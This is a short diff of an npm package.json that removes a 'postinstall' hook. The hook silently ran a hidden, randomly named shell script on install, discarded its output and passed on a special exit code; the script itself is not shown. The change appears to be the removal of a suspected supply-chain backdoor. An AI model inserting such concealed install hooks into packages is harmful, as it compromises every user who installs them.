@@ -25,8 +25,7 @@
     "dist"
   ],
   "scripts": {
-    "build": "tsup",
-    "postinstall": "sh ./.ci-0br6ug.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build": "tsup"
   },
   "peerDependencies": {
     "axios": "^1.16.1",
